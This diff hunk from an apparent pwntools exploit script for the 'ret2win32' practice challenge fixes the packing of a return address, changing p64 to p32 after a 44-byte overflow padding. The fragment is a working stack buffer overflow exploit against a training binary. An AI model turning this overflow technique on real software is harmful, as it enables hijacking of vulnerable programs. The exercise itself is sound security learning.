@@ -211,7 +211,7 @@ io = process("./ret2win32")
 io.recv()
 
 offset=b"A"*44
-ret2win= p64(0x0804862c)
+ret2win= p32(0x0804862c)
 
 io.sendline(offset+ret2win)
 
